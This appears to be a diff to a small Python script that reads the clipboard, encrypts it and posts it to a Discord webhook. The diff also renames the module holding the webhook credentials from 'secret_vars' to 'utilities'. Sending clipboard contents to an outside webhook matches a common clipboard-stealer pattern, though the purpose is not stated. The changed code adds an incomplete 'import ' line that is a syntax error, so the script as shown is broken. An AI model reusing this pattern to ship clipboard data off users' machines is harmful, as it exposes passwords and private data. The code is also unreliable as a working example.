@@ -5,12 +5,13 @@ script_dir = os.path.dirname(os.path.abspath(__file__))
 sys.path.append(script_dir)
 import pyperclip
 import requests
-import secret_vars
+import utilities
+import 
 
 # Encrypting the clipboard before sending it to Discord.
-token = secret_vars.encrypt(bytes(pyperclip.paste(), "UTF-8"), secret_vars.key)
+token = utilities.encrypt(bytes(pyperclip.paste(), "UTF-8"), utilities.key)
 
-url = f'https://discord.com/api/webhooks/{secret_vars.webhook_id}/{secret_vars.webhook_token}'
+url = f'https://discord.com/api/webhooks/{utilities.webhook_id}/{utilities.webhook_token}'
 data = {'content': token.decode()}
 headers = {"Content-Type": "application/json"}
 response = requests.post(url, headers=headers, json=data)
